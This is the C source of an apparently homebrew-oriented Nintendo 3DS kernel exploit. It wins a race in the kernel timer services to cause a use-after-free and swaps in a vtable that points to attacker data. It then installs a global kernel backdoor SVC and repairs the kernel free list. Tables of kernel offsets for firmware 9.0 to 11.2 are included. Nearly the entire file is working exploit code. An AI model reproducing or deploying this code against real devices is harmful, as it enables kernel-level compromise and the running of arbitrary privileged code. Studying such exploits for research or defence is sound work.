/* Exploit-related code. Ned Williamson 2016 */
#include <3ds.h>
#include <stdio.h>
#include "backdoor.h"
#include "exploit.h"
#include "timer.h"
#include "util.h"

extern void *handle_lookup_kern;
extern void *RandomStub;
extern u32 **svc_handler_table_writable;
extern void *svc_7b_free_area;
extern void *svc_7b_free_area_writable;

#define TIMER2_NEXT_KERNEL 0xe281100c

static u32 fptrs[16] = {
  (u32)&install_global_backdoor,
  (u32)&install_global_backdoor,
  (u32)&install_global_backdoor,
  (u32)&install_global_backdoor,
  (u32)&install_global_backdoor,
  (u32)&install_global_backdoor,
  (u32)&install_global_backdoor,
  (u32)&install_global_backdoor,
  (u32)&install_global_backdoor,
  (u32)&install_global_backdoor,
  (u32)&install_global_backdoor,
  (u32)&install_global_backdoor,
  (u32)&install_global_backdoor,
  (u32)&install_global_backdoor,
  (u32)&install_global_backdoor,
  (u32)&install_global_backdoor,
};

#define LINEAR_KERN_TO_USER(addr) ((addr) - 0xE0000000 + 0x14000000)

/* is this valid across versions? */
#define KTIMER_POOL_HEAD 0xFFF33278
#define KTIMER_BASE (0xFFF70000 + 0x4E20)
#define KTIMER_OBJECT_SIZE 0x3C
#define KTIMER_POOL_SIZE 0xE10
#define KTIMER_END (KTIMER_BASE + KTIMER_POOL_SIZE)
#define NUM_TIMER_OBJECTS (KTIMER_POOL_SIZE / KTIMER_OBJECT_SIZE)

/* if the UAF succeeded, setup mybackdoor */
static bool try_setup_global_backdoor() {
  Handle timer, timer2;
  Result res;

  vu32 *timer2_next_user = (u32 *)LINEAR_KERN_TO_USER(TIMER2_NEXT_KERNEL);

  u32 orig_value = *timer2_next_user;
  /* orig_value is usually NULL. I think this is actually critical
   * for stability as it makes the next timer to alloc NULL, so other
   * procs can't interfere!
   */

  res = svcCreateTimer(&timer, PULSE_EVENT);
  if (res < 0) {
    printf("setup_global_backdoor: couldn't create timer1\n");
    return false;
  }

  res = svcCreateTimer(&timer2, PULSE_EVENT);
  if (res < 0) {
    printf("setup_global_backdoor: couldn't create timer2\n");
    svcCloseHandle(timer);
    return false;
  }

  u32 current_value = *timer2_next_user;

  /* if nothing changed, then we didn't win the race */
  if (orig_value == current_value) {
    res = svcCloseHandle(timer2);
    if (res < 0) {
      printf("setup_global_backdoor: warning: couldn't destroy timer2\n");
    }

    res = svcCloseHandle(timer);
    if (res < 0) {
      printf("setup_global_backdoor: warning: couldn't destroy timer\n");
    }

    return false;
  }

  printf("we won!\n");

  /* we won the race! replace vtable with our own */
  *timer2_next_user = (u32)&fptrs;

  /* this installs the backdoor */
  svcCancelTimer(timer2);

  /* put vtable back so we can free normally */
  /* leave timer in handle table, don't let others allocate */
  /* this is the easiest way I can think of to avoid the node getting
   * picked up by another process atm.
   */
  *timer2_next_user = current_value;
  /* reset refcount to 1 since we overwrote it */
  timer2_next_user[1] = 1;

  res = svcCloseHandle(timer2);
  if (res < 0) {
    printf("setup_global_backdoor: warning: couldn't destroy timer2\n");
  }

  res = svcCloseHandle(timer);
  if (res < 0) {
    printf("setup_global_backdoor: warning: couldn't destroy timer\n");
  }

  return true;
}

/* TODO upper bound is 11.1+ only */
#define IS_VTABLE(addr) (0xFFF2E000 <= (u32)(addr) && (u32)(addr) < 0xFFF2F000)
#define TOBJ_ADDR_TO_IDX(addr) (((u32)(addr) - KTIMER_BASE) / KTIMER_OBJECT_SIZE)
#define TOBJ_IDX_TO_ADDR(idx) (KTIMER_BASE + KTIMER_OBJECT_SIZE * (u32)(idx))

static bool find_broken_link(void ***parent_ret, void **child_ret) {
  void *next_table[NUM_TIMER_OBJECTS] = { };
  void *prev_table[NUM_TIMER_OBJECTS] = { };

  /* initialize return values */
  *parent_ret = NULL;
  *child_ret = NULL;

  u32 i = 0;
  /* build hash tables, O(n) */
  for (void *parent = (void *)KTIMER_BASE;
       parent < (void *)KTIMER_END;
       parent += KTIMER_OBJECT_SIZE, i++) {
    void *child = (void *)kreadint(parent);
    //printf("parent: %p, child: %p, TOBJ_ADDR_TO_IDX(parent) = 0x%lx, TOBJ_ADDR_TO_IDX(child) = 0x%lx\n", parent, child, TOBJ_ADDR_TO_IDX(parent), TOBJ_ADDR_TO_IDX(child));
    if (TOBJ_ADDR_TO_IDX(parent) != i) {
      printf("[!] Got TOBJ_ADDR_TO_IDX(parent) != i: 0x%lx != 0x%lx\n",
             TOBJ_ADDR_TO_IDX(parent), i);
      wait_for_user();
    }
    printf("%ld -> 0x%lx (0x%lx)\n", TOBJ_ADDR_TO_IDX(parent), (u32)child, TOBJ_ADDR_TO_IDX(child));
    if (IS_VTABLE(child)) {
      /* for allocated objects, use non-null filler values since
       * our checks just look for null
       */
      next_table[TOBJ_ADDR_TO_IDX(parent)] = (void *)1;
      /* write to 'parent' of both next and prev, clearing them */
      /* TODO we should probably be checking if 1 was written already */
      prev_table[TOBJ_ADDR_TO_IDX(parent)] = (void *)1;
    } else if (child == (void *)TIMER2_NEXT_KERNEL) {
      *parent_ret = parent;
      next_table[TOBJ_ADDR_TO_IDX(parent)] = (void *)1;
    } else {
      /* if freed, add tuples in both directions */
      next_table[TOBJ_ADDR_TO_IDX(parent)] = child;
      prev_table[TOBJ_ADDR_TO_IDX(child)] = parent;
    }
  }
  if (i != NUM_TIMER_OBJECTS) {
    printf("[!] Unexpected number of iterations over timer object list.\n");
    printf("[!] Got %lu, expected %u.\n", i, NUM_TIMER_OBJECTS);
    return false;
  }

  /* account for list head. only care about objects themselves, so don't
   * update next_table.
   */
  void *head_parent = (void *)KTIMER_POOL_HEAD;
  void *head_child = (void *)kreadint_real(head_parent);
  if (head_child) {
    prev_table[TOBJ_ADDR_TO_IDX(head_child)] = head_parent;
  }

  /* abandoned child node is lowest object with next != NULL, prev == NULL */
  /* first null next: need to write correct next here */
  /* only null prev: what to write there */

  /* this could happen but if we really allocated all the timer objects, the
   * exploit probably work work anyways :p gotta reboot!
   */
  if (next_table[NUM_TIMER_OBJECTS - 1] != NULL) {
    printf("[!] Warning! Bad invariant: last node does not point to NULL\n");
    printf("[!] The exploit cannot cleanup sufficiently.\n");
    printf("[!] Please reboot your 3DS and try again.\n");
    return false;
  }

  for (i = 0; i < NUM_TIMER_OBJECTS; i++) {
    /* ignore last node for next, as it's always NULL */
    if (prev_table[i] == NULL) {
      if (*child_ret != NULL) {
        printf("[!] Warning: unexpectedly found more than one NULL prev.\n");
        wait_for_user();
      }
      *child_ret = (void *)TOBJ_IDX_TO_ADDR(i);
      printf("[+] found child: (%p ->) %p\n", prev_table[i], *child_ret);
      wait_for_user();
    }
  }
  if (*parent_ret == NULL) {
    printf("[-] Failed to find parent for broken link search.\n");
    return false;
  }

  if (*child_ret == NULL) {
    printf("[-] Failed to find child for broken link search.\n");
    return false;
  }

  return true;
}

static bool cleanup_uaf() {
  /* TODO: this entire function is TOCTTOU of kernel free list state */
  /* at this point the kernel timer free list contains a userspace item.
   * we need to fix that.
   */

  void **parent = NULL;
  void *child = NULL;

  if (!find_broken_link(&parent, &child)) {
    printf("[-] Failed to find broken link in linked list.\n");
    return false;
  }

  printf("Got broken link: %p -> %p\n", parent, child);

  kwriteint_real((u32 *)parent, (u32)child);
  return true;
}

static bool initialize_timer_state() {
  Result res;
  Handle timer;

  /* alloced: timer1 */
  res = svcCreateTimer(&timer, 0);
  if (res < 0) {
    printf("failed to create timer1\n");
    return false;
  }

  /* alloced: timer1, timer2 */
  Handle timer2;
  res = svcCreateTimer(&timer2, 2);
  if (res < 0) {
    printf("failed to create timer2\n");
    svcCloseHandle(timer);
    return false;
  }

  u64 timeout = 0x100000000 | (u32)RandomStub;
  u32 carry = timeout % 3;
  timeout /= 3;
  svcCancelTimer(timer2);

  if (!set_timer(timer2, 0xaaa00000, 0)) {
    printf("set_timer_test: set_timer failed\n");
    svcCloseHandle(timer2);
    svcCloseHandle(timer);
    return false;
  }

  if (!set_timer(timer2, (u32)timeout, carry)) {
    printf("set_timer_test: set_timer failed\n");
    svcCloseHandle(timer2);
    svcCloseHandle(timer);
    return false;
  }

  if (mybackdoor_installed()) {
    u64 initial = 0;
    if (!get_timer_value(timer2, &initial, NULL)) {
      printf("set_timer_test: get_timer_value failed\n");
      svcCloseHandle(timer2);
      svcCloseHandle(timer);
      return false;
    }

    u32 target = (u32)((initial) >> 32);
    if (target != (u32)(void*)RandomStub) {
      printf("warning: got bad target: %lx\n", target);
      printf("returning early for debug purposes\n");
      return false;
    } else {
      printf("got good target!\n");
    }
    wait_for_user();
  }

  /* alloced: timer1 */
  /* freed: timer2 -> ... */
  res = svcCloseHandle(timer2);
  if (res < 0) {
    printf("failed to close timer handle\n");
    return false;
  }

  /* freed: timer1 -> timer2 -> ... */
  res = svcCloseHandle(timer);
  if (res < 0) {
    printf("failed to close timer handle\n");
    return false;
  }
  return true;
}

/* returns true if attempt succeeded */
/* call this after initialize_state */
static void try_once() {
  Handle timer;
  /* each round, we allocate timer1, run the pulse timer,
   * then free it. if it frees while pulsing a UAF occurs
   * and we have &timer2 where &timer1->vtable should be.
   * so we get a vtable call where the fields from timer2
   * were controlled
   *
   * then we get (timer2+0x3c)(timer2, ...)
   * so return to any kernel function that writes an error to R0
   * 0xE....... which is R/W shared with userspace 0x2.......
   * this gives us *timer2 = userspace_addr;
   * and the timer object free list is timer1 -> timer2 -> ...
   * so we need to alloc two times to get timer2, then we should
   * be able to overwrite its vtable as we please using the shared
   * memory
   */

  svcCreateTimer(&timer, PULSE_EVENT);
  // set timer with a quick first pulse, long second pulse
  // 6000 found using random trial and error. there might be
  // a better value
  svcSetTimer(timer, 8000, 0x1000000000);
  // hope the pulse race happens
  svcCloseHandle(timer);
  svcSleepThread(1000000);

  /* reallocate the freed timer and clear it from the scheduler */
  svcCreateTimer(&timer, PULSE_EVENT);
  svcCancelTimer(timer);
  svcCloseHandle(timer);
}

typedef struct version_table {
  u32 kver;
  u32 handle_lookup;
  u32 random_stub;
  u32 svc_handler_table;
  u32 free_area;
} version_table;

// New 3DS
static version_table n_table[] = {
  {SYSTEM_VERSION(2, 46, 0),  0xFFF18D5C, 0xFFF1B1A4, 0xFFF02300, 0xFFF2CA2C},  // 9.0
  {SYSTEM_VERSION(2, 48, 3),  0xFFF18AFC, 0xFFF1B188, 0xFFF02310, 0xFFF2CF94},  // 9.3
  {SYSTEM_VERSION(2, 49, 0),  0xFFF18AF0, 0xFFF1B17C, 0xFFF0230C, 0xFFF2CF88},  // 9.5
  {SYSTEM_VERSION(2, 50, 1),  0xFFF18B18, 0xFFF1B1A4, 0xFFF02308, 0xFFF2CFCC},  // 9.6
  {SYSTEM_VERSION(2, 50, 7),  0xFFF18AF0, 0xFFF1B17C, 0xFFF02310, 0xFFF2CFA4},  // 10.0
  {SYSTEM_VERSION(2, 50, 9),  0xFFF18AF0, 0xFFF1B17C, 0xFFF02310, 0xFFF2CFA4},  // 10.2
  {SYSTEM_VERSION(2, 50, 11), 0xFFF18AF0, 0xFFF1B17C, 0xFFF02310, 0xFFF2CFD0},  // 10.4
  {SYSTEM_VERSION(2, 51, 0),  0xFFF18CD4, 0xFFF1B5FC, 0xFFF0230C, 0xFFF2D710},  // 11.0
  {SYSTEM_VERSION(2, 51, 2),  0xFFF18CD4, 0xFFF1B63C, 0xFFF0230C, 0xFFF2D7D0},  // 11.1
  {SYSTEM_VERSION(2, 52, 0),  0xFFF18CF4, 0xFFF1B65C, 0xFFF0230C, 0xFFF2D7F0},  // 11.2
  {0},
};

// Old 3DS
static version_table o_table[] = {
  {SYSTEM_VERSION(2, 46, 0),  0xFFF184C0, 0xFFF1A830, 0xFFF02330, 0xFFF2B82C},  // 9.0
  {SYSTEM_VERSION(2, 48, 3),  0xFFF185C0, 0xFFF1AB50, 0xFFF0232C, 0xFFF2BD68},  // 9.3
  {SYSTEM_VERSION(2, 49, 0),  0xFFF185B4, 0xFFF1AB44, 0xFFF02328, 0xFFF2BD5C},  // 9.5
  {SYSTEM_VERSION(2, 50, 1),  0xFFF185DC, 0xFFF1AB6C, 0xFFF02324, 0xFFF2BDA0},  // 9.6
  {SYSTEM_VERSION(2, 50, 7),  0xFFF185A8, 0xFFF1AB38, 0xFFF0232C, 0xFFF2BD6C},  // 10.0
  {SYSTEM_VERSION(2, 50, 9),  0xFFF185A8, 0xFFF1AB38, 0xFFF0232C, 0xFFF2BD6C},  // 10.2
  {SYSTEM_VERSION(2, 50, 11), 0xFFF185A8, 0xFFF1AB38, 0xFFF0232C, 0xFFF2BD98},  // 10.4
  {SYSTEM_VERSION(2, 51, 0),  0xFFF18A80, 0xFFF1B2AC, 0xFFF02328, 0xFFF2C514},  // 11.0
  {SYSTEM_VERSION(2, 51, 2),  0xFFF18A80, 0xFFF1B2EC, 0xFFF02328, 0xFFF2C5D4},  // 11.1
  {SYSTEM_VERSION(2, 52, 0),  0xFFF18AA0, 0xFFF1B30C, 0xFFF02328, 0xFFF2C5F4},  // 11.2
  {0},
};

/*
3dbrew 11.1 mapping
[L1 ] VA 1f300000..1f400000 -> PA 1f300000..1f400000 [  X ] [ Priv: RW, User: -- ]
[L1 ] VA d8000000..d8600000 -> PA 18000000..18600000 [ XN ] [ Priv: RW, User: -- ]
[L1 ] VA df000000..df400000 -> PA 1f000000..1f400000 [ XN ] [ Priv: RW, User: -- ]
[L1 ] VA dff00000..e0000000 -> PA 1ff00000..20000000 [ XN ] [ Priv: RW, User: -- ]
[L1 ] VA e0000000..f0000000 -> PA 20000000..30000000 [ XN ] [ Priv: RW, User: -- ]
 ...
[L2L] VA fff00000..fff20000 -> PA 1ff80000..1ffa0000 [  X ] [ Priv: R-, User: -- ]
[L2S] VA fff20000..fff2e000 -> PA 1ffde000..1ffec000 [  X ] [ Priv: R-, User: -- ]
[L2S] VA fff2e000..fff2f000 -> PA 1ffec000..1ffed000 [ XN ] [ Priv: R-, User: -- ]
*/

/* TODO: 11.1+ only. make it work on <11.1 */
/*
static u32 kernel_va_to_pa(u32 addr) {
  if (0xfff00000 <= addr && addr < 0xfff20000) {
    return addr - 0xfff00000 + 0x1ff80000;
  } else if (0xfff20000 <= addr && addr < 0xfff2e000) {
    return addr - 0xfff20000 + 0x1ffde000;
  } else if (0xfff2e000 <= addr && addr < 0xfff2f000) {
    return addr - 0xfff2e000 + 0x1ffec000;
  }
  return 0;
}

static u32 kernel_pa_to_writable(u32 addr) {
  return 0;
}

static u32 kernel_va_to_writable(u32 addr) {
  u32 pa = kernel_va_to_pa(addr);
  return kernel_pa_to_writable(pa);
}
*/

static bool initialize_handle_address() {
  u32 kver = osGetKernelVersion();
  bool n3ds = false;
  APT_CheckNew3DS(&n3ds);

  version_table *table = n3ds ? n_table : o_table;

  while (table->kver) {
    if (table->kver == kver) {
      handle_lookup_kern = (void *)table->handle_lookup;
      RandomStub = (void *)table->random_stub;
      u32 svc_handler_table_pa = table->svc_handler_table - 0xfff00000 + 0x1ff80000;
      svc_handler_table_writable = (void *)(svc_handler_table_pa - 0x1ff00000 + 0xdff00000);
      svc_7b_free_area = (void *)table->free_area;
      /* hardcode 11.1+ for now */
      u32 svc_7b_free_area_pa = table->free_area - 0xfff20000 + 0x1ffde000;
      svc_7b_free_area_writable = (void *)(svc_7b_free_area_pa - 0x1ff00000 + 0xdff00000);
      return true;
    }
    table = table + 1;
  }
  return false;
}

static bool try_uaf(u32 attempts) {
  for (u32 i = 0; i < attempts; i++) {
    if ((i % 0x100) == 0) {
      printf("beginning attempt 0x%lx\n", i);
    }
    try_once();
    if (try_setup_global_backdoor()) {
      return true;
    }
  }
  return false;
}

#define NUM_ATTEMPTS 0x10000

bool k11_exploit() {
  if (global_backdoor_installed()) {
    printf("[+] Backdoor already installed.\n");
    return true;
  }

  if (!initialize_handle_address()) {
    printf("[-] Unsupported kernel version.\n");
    return false;
  }
  printf("[+] Initialized kernel-specific offsets.\n");

  if (!initialize_timer_state()) {
    printf("[-] Couldn't initialize timer state.\n");
    return false;
  }
  printf("[+] Initialized timer state.\n");

  if (!try_uaf(NUM_ATTEMPTS)) {
    printf("[!] Couldn't trigger UAF within %x iterations.\n", NUM_ATTEMPTS);
    printf("[*] It is safe to rerun fasthax to try again.\n");
    return false;
  }

  /* XXX: we might want to cleanup ASAP if printing needs to alloc 2 timers */
  if (!global_backdoor_installed()) {
    printf("[-] UAF reported success but backdoor not installed!\n");
    return false;
  }
  printf("[+] UAF succeeded and local backdoor installed.\n");

  /* global backdoor is installed using code from this process
   * We need to restore svcBackdoor code into the kernel now so we
   * can call this SVC from any process.
   */
  if (!finalize_global_backdoor()) {
    printf("[-] Couldn't finalize global backdoor.\n");
    printf("[-] We won't be able to run kernel code in other processes.\n");
    return false;
  }

  if (!cleanup_uaf()) {
    printf("[-] Warning! Exploit succeeded couldn't cleanup kernel.\n");
    printf("[-] System instability may occur.\n");
    return false;
  }

  return true;
}
